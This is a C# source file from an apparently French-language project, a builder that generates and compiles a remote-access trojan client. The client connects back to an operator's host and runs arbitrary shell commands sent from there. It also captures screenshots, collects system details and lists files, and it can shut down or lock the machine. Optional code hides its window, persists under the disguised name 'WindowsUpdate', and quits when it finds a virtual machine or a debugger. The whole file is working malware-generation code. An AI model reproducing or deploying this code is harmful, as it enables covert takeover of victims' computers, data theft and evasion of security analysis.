using GhostAnomalie.Common.Utils;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace GhostAnomalie.Server.Utils
{
    public class CodeGenerator
    {
        public async Task<BuilderResult> Generate(
            string ip, int port, string password, string clientName, string fileName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            try
            {
                var code = GenerateCode(ip, port, password, clientName, persist, startup, hide, antiVM, antiDebug);

                var outputDir = Path.Combine(Directory.GetCurrentDirectory(), Constants.ClientsFolder);
                Directory.CreateDirectory(outputDir);

                var csFile = Path.Combine(outputDir, $"{fileName}.cs");
                File.WriteAllText(csFile, code);

                var exeFile = Path.Combine(outputDir, $"{fileName}.exe");
                var compileResult = await Compile(csFile, exeFile);

                if (compileResult)
                {
                    return new BuilderResult
                    {
                        Success = true,
                        FilePath = exeFile,
                        Error = null
                    };
                }

                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = "Erreur de compilation. Assure-toi que .NET Framework 4.8 est installe."
                };
            }
            catch (Exception ex)
            {
                return new BuilderResult
                {
                    Success = false,
                    FilePath = null,
                    Error = ex.Message
                };
            }
        }

        private string GenerateCode(string ip, int port, string password, string clientName,
            bool persist, bool startup, bool hide, bool antiVM, bool antiDebug)
        {
            var sb = new StringBuilder();

            sb.AppendLine($"using System;");
            sb.AppendLine($"using System.Net.Sockets;");
            sb.AppendLine($"using System.Text;");
            sb.AppendLine($"using System.Text.Json;");
            sb.AppendLine($"using System.Diagnostics;");
            sb.AppendLine($"using System.IO;");
            sb.AppendLine($"using System.Threading.Tasks;");
            sb.AppendLine($"using Microsoft.Win32;");
            sb.AppendLine($"");
            sb.AppendLine($"namespace {clientName}");
            sb.AppendLine($"{{");
            sb.AppendLine($"    public class Program");
            sb.AppendLine($"    {{");
            sb.AppendLine($"        private static TcpClient _client;");
            sb.AppendLine($"        private static NetworkStream _stream;");
            sb.AppendLine($"        private static bool _running = true;");
            sb.AppendLine($"        private static string _serverIp = \"{ip}\";");
            sb.AppendLine($"        private static int _serverPort = {port};");
            sb.AppendLine($"        private static string _password = \"{password}\";");
            sb.AppendLine($"        private static string _clientId = Environment.MachineName;");
            sb.AppendLine($"");
            sb.AppendLine($"        public static async Task Main()");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            Console.Title = \"System\";");
            sb.AppendLine($"            Console.WriteLine(\"Ghost Anomalie Client v{Constants.Version}\");");
            sb.AppendLine($"");

            if (hide)
                sb.AppendLine($"            HideConsole();");

            if (persist)
                sb.AppendLine($"            AddPersistence();");

            if (startup)
                sb.AppendLine($"            AddStartup();");

            if (antiVM)
                sb.AppendLine($"            if (DetectVM()) return;");

            if (antiDebug)
                sb.AppendLine($"            if (DetectDebugger()) return;");

            sb.AppendLine($"");
            sb.AppendLine($"            while (_running)");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                try");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    await ConnectAndRun();");
            sb.AppendLine($"                }}");
            sb.AppendLine($"                catch");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    await Task.Delay(30000);");
            sb.AppendLine($"                }}");
            sb.AppendLine($"            }}");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static async Task ConnectAndRun()");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            _client = new TcpClient();");
            sb.AppendLine($"            await _client.ConnectAsync(_serverIp, _serverPort);");
            sb.AppendLine($"            _stream = _client.GetStream();");
            sb.AppendLine($"");
            sb.AppendLine($"            // Authentification");
            sb.AppendLine($"            var authPacket = new {{ command = \"{password}\", clientId = _clientId }};");
            sb.AppendLine($"            var json = JsonSerializer.Serialize(authPacket);");
            sb.AppendLine($"            var bytes = Encoding.UTF8.GetBytes(json);");
            sb.AppendLine($"            await _stream.WriteAsync(bytes, 0, bytes.Length);");
            sb.AppendLine($"");
            sb.AppendLine($"            // Attendre la reponse");
            sb.AppendLine($"            var buffer = new byte[8192];");
            sb.AppendLine($"            var read = await _stream.ReadAsync(buffer, 0, buffer.Length);");
            sb.AppendLine($"            var response = Encoding.UTF8.GetString(buffer, 0, read);");
            sb.AppendLine($"");
            sb.AppendLine($"            // Boucle principale");
            sb.AppendLine($"            while (_running && _client.Connected)");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                read = await _stream.ReadAsync(buffer, 0, buffer.Length);");
            sb.AppendLine($"                if (read == 0) break;");
            sb.AppendLine($"");
            sb.AppendLine($"                var cmdJson = Encoding.UTF8.GetString(buffer, 0, read);");
            sb.AppendLine($"                try {{");
            sb.AppendLine($"                    var packet = JsonSerializer.Deserialize<CommandPacket>(cmdJson);");
            sb.AppendLine($"                    if (packet != null) {{");
            sb.AppendLine($"                        await ProcessCommand(packet);");
            sb.AppendLine($"                    }}");
            sb.AppendLine($"                }} catch {{ }}");
            sb.AppendLine($"            }}");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static async Task ProcessCommand(dynamic packet)");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            var result = new {{ CommandId = packet.Id, Success = false, Data = \"\", Error = \"\" }};");
            sb.AppendLine($"");
            sb.AppendLine($"            try");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                var command = packet.Command?.ToString()?.ToLower() ?? \"\";");
            sb.AppendLine($"");
            sb.AppendLine($"                switch (command)");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    case \"screenshot\":");
            sb.AppendLine($"                        result.Data = TakeScreenshot();");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"sysinfo\":");
            sb.AppendLine($"                        result.Data = GetSystemInfo();");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"cmd\":");
            sb.AppendLine($"                        result.Data = ExecuteCommand(packet.Args?[0]?.ToString() ?? \"\");");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"ls\":");
            sb.AppendLine($"                        result.Data = ListFiles(packet.Args?[0]?.ToString() ?? \".\");");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"shutdown\":");
            sb.AppendLine($"                        Process.Start(\"shutdown\", \"/s /t 0\");");
            sb.AppendLine($"                        result.Data = \"Arret en cours\";");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"restart\":");
            sb.AppendLine($"                        Process.Start(\"shutdown\", \"/r /t 0\");");
            sb.AppendLine($"                        result.Data = \"Redemarrage en cours\";");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"lock\":");
            sb.AppendLine($"                        Process.Start(\"rundll32.exe\", \"user32.dll,LockWorkStation\");");
            sb.AppendLine($"                        result.Data = \"Ecran verrouille\";");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"ping\":");
            sb.AppendLine($"                        result.Data = \"Pong!\";");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    case \"exit\":");
            sb.AppendLine($"                        _running = false;");
            sb.AppendLine($"                        _client?.Close();");
            sb.AppendLine($"                        result.Data = \"Deconnexion\";");
            sb.AppendLine($"                        result.Success = true;");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"");
            sb.AppendLine($"                    default:");
            sb.AppendLine($"                        result.Error = $\"Commande inconnue: {{command}}\";");
            sb.AppendLine($"                        break;");
            sb.AppendLine($"                }}");
            sb.AppendLine($"            }}");
            sb.AppendLine($"            catch (Exception ex)");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                result.Error = ex.Message;");
            sb.AppendLine($"            }}");
            sb.AppendLine($"");
            sb.AppendLine($"            var json = JsonSerializer.Serialize(result);");
            sb.AppendLine($"            var bytes = Encoding.UTF8.GetBytes(json);");
            sb.AppendLine($"            await _stream.WriteAsync(bytes, 0, bytes.Length);");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static string TakeScreenshot()");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            try");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                using var bitmap = new System.Drawing.Bitmap(");
            sb.AppendLine($"                    System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width,");
            sb.AppendLine($"                    System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height");
            sb.AppendLine($"                );");
            sb.AppendLine($"");
            sb.AppendLine($"                using var graphics = System.Drawing.Graphics.FromImage(bitmap);");
            sb.AppendLine($"                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);");
            sb.AppendLine($"");
            sb.AppendLine($"                using var ms = new MemoryStream();");
            sb.AppendLine($"                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);");
            sb.AppendLine($"                return Convert.ToBase64String(ms.ToArray());");
            sb.AppendLine($"            }}");
            sb.AppendLine($"            catch");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                return \"Erreur: Impossible de capturer l'ecran\";");
            sb.AppendLine($"            }}");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static string GetSystemInfo()");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            var sb = new StringBuilder();");
            sb.AppendLine($"            sb.AppendLine($\"Machine: {{Environment.MachineName}}\");");
            sb.AppendLine($"            sb.AppendLine($\"Utilisateur: {{Environment.UserName}}\");");
            sb.AppendLine($"            sb.AppendLine($\"OS: {{Environment.OSVersion}}\");");
            sb.AppendLine($"            sb.AppendLine($\".NET: {{Environment.Version}}\");");
            sb.AppendLine($"            sb.AppendLine($\"Processeurs: {{Environment.ProcessorCount}}\");");
            sb.AppendLine($"            return sb.ToString();");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static string ExecuteCommand(string command)");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            try");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                var startInfo = new ProcessStartInfo");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    FileName = \"cmd.exe\",");
            sb.AppendLine($"                    Arguments = $\"/c {{command}}\",");
            sb.AppendLine($"                    RedirectStandardOutput = true,");
            sb.AppendLine($"                    RedirectStandardError = true,");
            sb.AppendLine($"                    UseShellExecute = false,");
            sb.AppendLine($"                    CreateNoWindow = true");
            sb.AppendLine($"                }};");
            sb.AppendLine($"");
            sb.AppendLine($"                using var process = Process.Start(startInfo);");
            sb.AppendLine($"                var output = process?.StandardOutput.ReadToEnd() ?? \"\";");
            sb.AppendLine($"                var error = process?.StandardError.ReadToEnd() ?? \"\";");
            sb.AppendLine($"                return string.IsNullOrEmpty(error) ? output : $\"Erreur: {{error}}\";");
            sb.AppendLine($"            }}");
            sb.AppendLine($"            catch (Exception ex)");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                return $\"Erreur: {{ex.Message}}\";");
            sb.AppendLine($"            }}");
            sb.AppendLine($"        }}");
            sb.AppendLine($"");
            sb.AppendLine($"        private static string ListFiles(string path)");
            sb.AppendLine($"        {{");
            sb.AppendLine($"            try");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                var sb = new StringBuilder();");
            sb.AppendLine($"                var dir = new DirectoryInfo(path);");
            sb.AppendLine($"");
            sb.AppendLine($"                foreach (var d in dir.GetDirectories())");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    sb.AppendLine($\"📁 {{d.Name}}/\");");
            sb.AppendLine($"                }}");
            sb.AppendLine($"");
            sb.AppendLine($"                foreach (var f in dir.GetFiles())");
            sb.AppendLine($"                {{");
            sb.AppendLine($"                    sb.AppendLine($\"📄 {{f.Name}} ({{f.Length}} octets)\");");
            sb.AppendLine($"                }}");
            sb.AppendLine($"");
            sb.AppendLine($"                return sb.ToString();");
            sb.AppendLine($"            }}");
            sb.AppendLine($"            catch (Exception ex)");
            sb.AppendLine($"            {{");
            sb.AppendLine($"                return $\"Erreur: {{ex.Message}}\";");
            sb.AppendLine($"            }}");
            sb.AppendLine($"        }}");

            if (persist)
            {
                sb.AppendLine($"");
                sb.AppendLine($"        private static void AddPersistence()");
                sb.AppendLine($"        {{");
                sb.AppendLine($"            try");
                sb.AppendLine($"            {{");
                sb.AppendLine($"                var key = Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\");");
                sb.AppendLine($"                key.SetValue(\"WindowsUpdate\", System.Reflection.Assembly.GetExecutingAssembly().Location);");
                sb.AppendLine($"                key.Close();");
                sb.AppendLine($"            }}");
                sb.AppendLine($"            catch {{ }}");
                sb.AppendLine($"        }}");
            }

            if (startup)
            {
                sb.AppendLine($"");
                sb.AppendLine($"        private static void AddStartup()");
                sb.AppendLine($"        {{");
                sb.AppendLine($"            try");
                sb.AppendLine($"            {{");
                sb.AppendLine($"                var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);");
                sb.AppendLine($"                var exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;");
                sb.AppendLine($"                File.Copy(exePath, Path.Combine(startupPath, \"WindowsUpdate.exe\"), true);");
                sb.AppendLine($"            }}");
                sb.AppendLine($"            catch {{ }}");
                sb.AppendLine($"        }}");
            }

            if (hide)
            {
                sb.AppendLine($"");
                sb.AppendLine($"        [System.Runtime.InteropServices.DllImport(\"user32.dll\")]");
                sb.AppendLine($"        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);");
                sb.AppendLine($"");
                sb.AppendLine($"        [System.Runtime.InteropServices.DllImport(\"kernel32.dll\")]");
                sb.AppendLine($"        private static extern IntPtr GetConsoleWindow();");
                sb.AppendLine($"");
                sb.AppendLine($"        private static void HideConsole()");
                sb.AppendLine($"        {{");
                sb.AppendLine($"            var handle = GetConsoleWindow();");
                sb.AppendLine($"            ShowWindow(handle, 0);");
                sb.AppendLine($"        }}");
            }

            if (antiVM)
            {
                sb.AppendLine($"");
                sb.AppendLine($"        private static bool DetectVM()");
                sb.AppendLine($"        {{");
                sb.AppendLine($"            try");
                sb.AppendLine($"            {{");
                sb.AppendLine($"                var vmProcesses = new[] {{ \"vmtoolsd.exe\", \"vboxservice.exe\", \"xenservice.exe\", \"vmware.exe\" }};");
                sb.AppendLine($"                foreach (var proc in Process.GetProcesses())");
                sb.AppendLine($"                {{");
                sb.AppendLine($"                    try");
                sb.AppendLine($"                    {{");
                sb.AppendLine($"                        foreach (var vm in vmProcesses)");
                sb.AppendLine($"                        {{");
                sb.AppendLine($"                            if (proc.ProcessName.ToLower().Contains(vm.Replace(\".exe\", \"\")))");
                sb.AppendLine($"                                return true;");
                sb.AppendLine($"                        }}");
                sb.AppendLine($"                    }}");
                sb.AppendLine($"                    catch {{ }}");
                sb.AppendLine($"                }}");
                sb.AppendLine($"            }}");
                sb.AppendLine($"            catch {{ }}");
                sb.AppendLine($"            return false;");
                sb.AppendLine($"        }}");
            }

            if (antiDebug)
            {
                sb.AppendLine($"");
                sb.AppendLine($"        private static bool DetectDebugger()");
                sb.AppendLine($"        {{");
                sb.AppendLine($"            try");
                sb.AppendLine($"            {{");
                sb.AppendLine($"                if (Debugger.IsAttached) return true;");
                sb.AppendLine($"            }}");
                sb.AppendLine($"            catch {{ }}");
                sb.AppendLine($"            return false;");
                sb.AppendLine($"        }}");
            }

            sb.AppendLine($"    }}");
            sb.AppendLine($"");
            sb.AppendLine($"    public class CommandPacket");
            sb.AppendLine($"    {{");
            sb.AppendLine($"        public string Id {{ get; set; }} = Guid.NewGuid().ToString();");
            sb.AppendLine($"        public string Command {{ get; set; }} = \"\";");
            sb.AppendLine($"        public string[]? Args {{ get; set; }}");
            sb.AppendLine($"        public string? ClientId {{ get; set; }}");
            sb.AppendLine($"    }}");
            sb.AppendLine($"}}");

            return sb.ToString();
        }

        private async Task<bool> Compile(string csFile, string exeFile)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "dotnet",
                    Arguments = $"build \"{csFile}\" -c Release -o \"{Path.GetDirectoryName(exeFile)}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using var process = Process.Start(startInfo);
                if (process != null)
                {
                    process.WaitForExit();

                    if (File.Exists(exeFile))
                        return true;
                }

                var cscPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Microsoft.NET", "Framework", "v4.0.30319", "csc.exe"
                );

                if (File.Exists(cscPath))
                {
                    var args = $"/target:winexe /out:\"{exeFile}\" \"{csFile}\"";
                    var process2 = Process.Start(cscPath, args);
                    if (process2 != null)
                    {
                        process2.WaitForExit();

                        if (File.Exists(exeFile))
                            return true;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
    }

    public class BuilderResult
    {
        public bool Success { get; set; }
        public string? FilePath { get; set; }
        public string? Error { get; set; }
    }
}
